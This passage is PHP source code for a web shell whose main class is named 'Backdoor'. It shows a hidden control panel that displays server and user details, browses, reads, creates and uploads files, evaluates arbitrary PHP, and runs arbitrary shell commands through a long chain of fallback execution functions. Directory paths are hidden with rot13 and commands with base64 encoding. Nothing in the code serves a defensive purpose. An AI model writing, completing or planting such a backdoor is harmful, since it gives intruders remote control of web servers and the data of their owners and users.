                        span{font-weight: bolder;}
                        span.wfw{font-weight:normal;}
                        h1{border-left:5px solid {$green_color};padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px;}
                        div.content{padding: 5px;margin-left:5px;background-color:#333;}
                        a{text-decoration:none;}
                        a:hover{text-decoration:underline;}
                        .ml1{border:1px solid #444;padding:5px;margin:0;overflow: auto;}
                        .bigarea{width:100%;height:400px;}
                        input,textarea,select{margin:0;color:#fff;background-color:#555;border:1px solid {$green_color}; font: 9pt Monospace,'Courier New';}
                        form{margin:0px;}
                        #toolsTbl{text-align:center;}
                        .toolsInp{width:500px}
                        .main th{text-align:left;background-color:#5e5e5e;}
                        .main tr:hover{background-color:#5e5e5e}
                        .l1{background-color:#444}
                        .l2{background-color:#333}
                        pre{font-family:Courier,Monospace;}
                    </style>\x0d\x0a
                    <script>
                        var c_ = '" . encode_html_entities(str_rot13($current_working_dir)) . "';
                        var a_ = '".encode_html_entities($_POST["a"])."';
                        var ch_ = '".encode_html_entities($_POST["ch"])."';
                        var p_ = '".((strpos($_POST["p"],"\x0a")!==false)?"":encode_html_entities($_POST["p"],3))."';
                        var x_ = '".((strpos($_POST["x"],"\x0a")!==false)?"":encode_html_entities($_POST["x"],3))."';
                        var s_ = '".((strpos($_POST["s"],"\012")!==false)?"":encode_html_entities($_POST["s"],3))."';
                        var d = document;
                        
                        function set(a,c,p,x,s,ch){
                            if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
                            if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
                            if(p!=null)d.mf.p.value=p;else d.mf.p.value=p_;
                            if(x!=null)d.mf.x.value=x;else d.mf.x.value=x_;
                            if(s!=null)d.mf.s.value=s;else d.mf.s.value=s_;
                            if(ch!=null)d.mf.ch.value=ch;else d.mf.ch.value=ch_;
                        }
                        function g(a,c,p,x,s,ch){
                            set(a,c,p,x,s,ch);
                            d.mf.submit();
                        }
                        function utoa(str){
                            return window.btoa(unescape(encodeURIComponent(str)));
                        }
                        function atou(str){
                            return decodeURIComponent(escape(window.atob(str)));
                        }
                        function rot13(str){
                            var input='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop\x71rstuvwxyz';
                            var output='NOPQRSTUVWXY\132ABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'; 
                            var index=x=> input.indexOf(x); 
                            var translate=x=> index(x) > -1 ? output[index(x)] : x; 
                            return str.split('').map(translate).join('');
                        }

                        var cvis=false;
                        
                        function show(){
                            if(!cvis){
                                document.getElementById('bat').innerHTML='Links';
                                document.getElementById('cwd').style.display='inline';
                                document.getElementById('links').style.display='none';cvis=true;
                            }else{
                                document.getElementById('bat').innerHTML='Text';
                                document.getElementById('cwd').style.display='none';
                                document.getElementById('links').style.display='inline';
                                cvis=false;
                            }
                        }
                    </script>
                </head>
                <body>
                    <div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
                        <form method=post name=mf style='display:none;'>
                            <input type=hidden name=a>
                            <input type=hidden name=c>
                            <input type=hidden name=p>
                            <input type=hidden name=x>
                            <input type=hidden name=s>
                            <input type=hidden name=ch>
                        </form>";
                        
        if(@function_exists("diskfreespace"))$_j=@diskfreespace($current_working_dir);
        if(@function_exists("disk_total_space"))$_gpj=@disk_total_space($current_working_dir);
        $_gpj=$_gpj ? $_gpj : 1;
        
        if(@function_exists("php_uname")){
            $_oj=@php_uname();
        }elseif(@function_exists("phpinfo")){
            @ob_start();
            phpinfo();
            $_d=@ob_get_clean();
            
            if(false!==@preg_match("!<tr><td class=\"e\">System\s*</td><td class=\"v\">([^\<]+)!i",$_d,$_nyn))$_oj=trim($_nyn[1]);
        }
        
        if(
            @function_exists("posix_getpwuid")&&
            @function_exists("posix_geteuid")&&@
            function_exists("posix_getgrgid")&&
            @function_exists("posix_getegid")){
                $_hxq=@posix_getpwuid(@posix_geteuid());
                $_t=@posix_getgrgid(@posix_getegid());
                $_tr=$_hxq["name"];
                $_hxq=$_hxq["uid"];
                $_yma=$_t["name"];
                $_t=$_t["gid"];
        }else{

                if(@function_exists("get_current_user"))$_tr=@get_current_user();
                if(@function_exists("getmyuid"))$_hxq=@getmyuid();
                if(@function_exists("getmygid"))$_t=@getmygid();
                $_yma="?";
        }
            
        if(@function_exists("mb_detect_encoding")&&@function_exists("iconv"))if(@mb_detect_encoding($_tr,"Windows-1251")){
            $_tr=@iconv("Windows-1251","UTF-8",$_tr);
        }
        
        $_awg="";
        $_v=@explode("/",$current_working_dir);
        $_l=count($_v);
        
        for($_hpa=0;$_hpa<$_l-1;$_hpa++){
            $_awg.="<a href='#' onclick='g(\"fm\",\"";
            for($_b=0;$_b<=$_hpa;$_b++)$_awg.=str_rot13($_v[$_b])."/";$_awg.="\",\"\",\"\")'>".$_v[$_hpa]."/</a>";
        }
        
        $_a=array("UTF-8","Windows-1251","KOI8-R","KOI8-U","cp866");
        $_yt="";
        
        foreach($_a as$_otj)$_yt.="<option value="".$_otj."" ".($_POST["ch"]==$_otj?"selected":"").">".$_otj."</option>";
        
        $_dv=array("PHP Info"=>"pi","Files"=>"fm","Exec"=>"ce","Eval"=>"ph","Logout"=>"lg");
        $_egz="";
        foreach($_dv as$_wkx=>$_wo)$_egz.="<th width=\"".(100/count($_dv))."%\">[ <a href=\"#\" onclick=\"g('".$_wo."',null,'','','')\">".$_wkx."</a> ]</th>";
        
        $_mdc="";
        if($_rfi=="win"){
            foreach(@range("c","z") as$_qlo)if(@is_dir($_qlo.":\x5c"))$_mdc.="<a href=\"#\" onclick=\"g('fm','".str_rot13($_qlo).":/')\">[ ".$_qlo." ]</a> ";
        }
        
        $_vy=$_SERVER["SERVER_ADDR"];
        
        if(empty($_vy)){
            $_vy=@gethostbyname($_SERVER["SERVER_NAME"]);
        }
        
        echo"
            <table class=info cellpadding=3 cellspacing=0 width=100%>
                <tr>
                    <td width=1>
                        <span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:".($_rfi=="win"?"<br>Drives:":"").
                        "</span>
                    </td>".
                    "<td>
                        <nobr>".($_oj?substr($_oj,0,120):"N/A")."</nobr><br>".
                        $_hxq." ( ".$_tr." ) <span>Group:</span> ".
                        $_t." ( ".$_yma." )<br>".
                        @phpversion()." ".@preg_replace("# .+$#","",$_SERVER["SERVER_SOFTWARE"])." <span>Safe mode:</span> ".($safe_mode?"<font color=red>ON</font>":"<font color=green><b>OFF</b></font>")." <span>Datetime:</span> ".date("\x59-m-d H:i:s")."<br>".
                        ($_gpj?get_file_size_human_readable($_gpj):"")." <span>Free:</span> ".($_j?get_file_size_human_readable($_j):"")." (".(($_j&&$_gpj)?(int)($_j/$_gpj*(100)):"0")."%)<br>
                        <span id="links" class="wfw">".$_awg." ".get_file_perms_html($current_working_dir).
                            "<a href=# onclick=\"g('fm','".str_rot13($document_root)."','','','')\">[ root ]</a>
                            <a href=# onclick="g('fm','".str_rot13($file_dir)."','','','')">[ home ]</a>
                        </span>
                        <span id=\"cwd\" style=\"display: none;\" class=\"wfw\">
                            <input size=".(strlen($current_working_dir)+(22))." type=text value=\"".$current_working_dir."\">
                        </span>
                        <a href=# onclick=\"show();\">
                            <font color=#fff id=\"bat\">Text</font>
                        </a><br>".$_mdc.
                    "</td>".
                    "<td width=1 align=right>
                        <nobr>
                        <select onchange=\"g(null,null,".(!empty($_POST["p"])?"'".$_POST["p"]."'":"null").",null,null,this.value)\">
                            <optgroup label=\"Page charset\">".$_yt."</optgroup>
                        </select><br>
                        <span>Server IP:</span><br>".
                        $_vy."<br>
                        <span>Client IP:</span><br>".$_SERVER["REMOTE_ADDR"]."</nobr>
                    </td>
                </tr>
            </table>".
            "<table style=\"border-top:2px solid #333;\" cellpadding=3 cellspacing=0 width=100%>
                <tr>".$_egz."</tr>
            </table>
            <div style=\"margin:5\">";
    }
    
    function lower_document_part(){
        $current_working_dir=$this->current_working_dir;
        $_z=@is_writable($current_working_dir)?" <font color='green'>(Writeable)</font>":" <font color=red>(Not writable)</font>";
        echo"</div>
            <table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
                <tr>
                    <td>
                        <form onsubmit='g(null,rot13(this.c.value),"");return false;'><span>Change dir:</span><br>
                            <input class='toolsInp' type=text name=c value='".encode_html_entities($current_working_dir)."'>
                            <input type=submit value='>>'>
                        </form>
                    </td>
                    <td>
                        <form onsubmit=\"g('ft',null,rot13(this.f.value));return false;\"><span>Read file:</span><br>
                            <input class='toolsInp' type=text name=f>
                            <input type=submit value='>>'>
                        </form>
                    </td>
                </tr>
                <tr>
                    <td>
                        <form onsubmit=\"g('fm',null,'md',rot13(this.d.value));return false;\"><span>Make dir:</span>".$_z."<br>
                            <input class='toolsInp' type=text name=d>
                            <input type=submit value='>>'>
                        </form>
                    </td>
                    <td>
                        <form onsubmit=\"g('ft',null,rot13(this.f.value),'mkfile');return false;\"><span>Make file:</span>".$_z."<br>
                            <input class='toolsInp' type=text name=f><input type=submit value='>>'>
                        </form>
                    </td>
                </tr>
                <tr>
                    <td>
                        <form onsubmit=\"g('ce',null,utoa(this.c.value));return false;\"><span>Execute:</span><br>
                            <input class='toolsInp' type=text name=c value=''>
                            <input type=submit value='>>'>
                        </form>
                    </td>
                    <td>
                        <form method='post' ENCTYPE='multipart/form-data'>
                            <input type=hidden name=a value='fm'>
                            <input type=hidden name=c value='".str_rot13($current_working_dir)."'>
                            <input type=hidden name=p value='uf'>
                            <input type=hidden name=ch value='".(isset($_POST["ch"])?$_POST["ch"]:"")."'><span>Upload file:</span>".$_z."<br>
                            <input class='toolsInp' type=file name=f>
                            <input type=submit value='>>'>
                        </form><br  >
                    </td>
                </tr>
            </table></div></body></html>";
    }
}
    
function encode_html_entities($_wo){
    return str_replace(array("&",'"',"<",">"),array("&amp;","&quot;","&lt;","&gt;"),$_wo);
}

function exec_shell_command($shell_command){

    @ob_start();
    if( $_hle = @`echo 1` ){
        echo @`{$shell_command}`;
    } elseif ( @function_exists("exec") ){
        @exec($shell_command,$_hle);
        echo @join("\x0a",$_hle);
    }elseif( @function_exists("system") ){
        @system($shell_command);
    } elseif( @function_exists("shell_exec") ){
        echo @shell_exec($shell_command);
    } elseif( @function_exists("passthru") ){
        @passthru($shell_command);
    } elseif( @is_resource($_gr=@popen($shell_command,"r")) ){    
        while( !feof($_gr) ){
            echo @fread($_gr,1024);
        }
        @pclose($_gr);
    }elseif(@is_resource($_gr=@proc_open($shell_command,array(array("pipe","r"),array("pipe","w"),array("pipe","a")),$_n))){
        echo @stream_get_contents($_n[1]);
        @proc_close($_gr);
    }elseif(@function_exists("pcntl_exec")){
        @pcntl_exec("/bin/sh",array("-c",$shell_command));
    }
    elseif(@function_exists("expect_popen")&&is_resource($_gr=@expect_popen($shell_command))){
        while(!feof($_gr))echo @fread($_gr,1024);
        @fclose($_gr);
    }elseif(@is_resource($_gr=@fopen("expect://".$shell_command,"r"))){
        while(!feof($_gr))echo @fread($_gr,1024);
        @fclose($_gr);
    }
    
    $result = @ob_get_clean();
    return $result;
}

function get_file_size_human_readable($file_size){

    if(is_int($file_size))$file_size=@sprintf("%u",$file_size);
    if($file_size>=1073741824)return @sprintf("%1.2f",$file_size/1073741824)." GB";
    elseif($file_size>=1048576)return @sprintf("%1.2f",$file_size/1048576)." MB";
    elseif($file_size>=1024)return @sprintf("%1.2f",$file_size/1024)." KB";
    else return$file_size." B";

}

function parse_file_perms($_n){

    if(($_n&49152)==49152)$_hpa="s";
    elseif(($_n&40960 )==40960)$_hpa="l";
    elseif(($_n&(32768))==32768)$_hpa="-";
    elseif(($_n&(24576))==24576)$_hpa="b";
    elseif(($_n&16384)==16384)$_hpa="d";
    elseif(($_n&(8192))==8192)$_hpa="c";
    elseif(($_n&4096)==4096)$_hpa="p";
    else $_hpa="u";
    
    $_hpa.=(($_n&(256))?"r":"-");
    $_hpa.=(($_n&(128))?"w":"-");
    $_hpa.=(($_n&(64))?(($_n&2048)?"s":"x"):(($_n&(2048))?"S":"-"));
    $_hpa.=(($_n&(32))?"r":"-");
    $_hpa.=(($_n&(16))?"w":"-");
    $_hpa.=(($_n&8)?(($_n&1024)?"s":"x"):(($_n&(1024))?"S":"-"));
    $_hpa.=(($_n&4)?"r":"-");
    $_hpa.=(($_n&2)?"w":"-");
    $_hpa.=(($_n&1)?(($_n&(512))?"t":"x"):(($_n&512)?"T":"-"));
    
    return$_hpa;
}

function get_file_perms_html($file){
    if(!@is_readable($file))return"<font color=#FF0000>".parse_file_perms(fileperms($file))."</font>";
    elseif(!@is_writable($file))return"<font color=white>".parse_file_perms(fileperms($file))."</font>";
    else return"<font color=#2\x35ff00>".parse_file_perms(fileperms($file))."</font>";
}

function scan_dir($dirname){

    if(@function_exists("scandir")){
        return @scandir($dirname);
    }else{
        if($dir=@opendir($dirname)){
            while(false!==($dir_entry=@readdir($dir)))$dir_entries[]=$dir_entry;
            @closedir($dir);
        }
        return $dir_entries;
    }
}

/**
 * Unused function
 */
function get_file_path($file){
    $file_path=exec_shell_command("which ".$file);
    
    if(!empty($file_path))return$file_path;
    
    return false;
}

$_sin=new Backdoor();
$_sin->authenticate();
$_sin->set_doc_vars();
$_sin->init();

if(isset($_POST["a"])){
    switch($_POST["a"]){
        case "fm":
            $_sin->upper_document_part();
            $_sin->file_manager();
            $_sin->lower_document_part();
            break;
        case "ce":
            @session_start();
            $_sin->upper_document_part();
            $_sin->exec_shell_command();
            $_sin->lower_document_part();
            break;
        case "Php":
        case "ph":
            $_sin->upper_document_part();
            $_sin->execute_php_code();
            $_sin->lower_document_part();
            break;
        case "phi":
        case "pi":
            $_sin->upper_document_part();
            $_sin->get_php_info();
            $_sin->lower_document_part();
            break;
        case "ft":
            if(isset($_POST["x"])&&($_POST["x"]=="download"||$_POST["x"]=="dl")){
                $_sin->file_tools();
            }else{
                $_sin->upper_document_part();
                $_sin->file_tools();
                $_sin->lower_document_part();
            }break;
        case "lg":
            $_sin->set_http_host_hash_cookie();
            break;
        default:
            $_sin->upper_document_part();
            $_sin->file_manager();
            $_sin->lower_document_part();
        break;
    }
}elseif(!isset($_POST["a"])){
    $_sin->upper_document_part();
    $_sin->file_manager();
    $_sin->lower_document_part();
}
die();
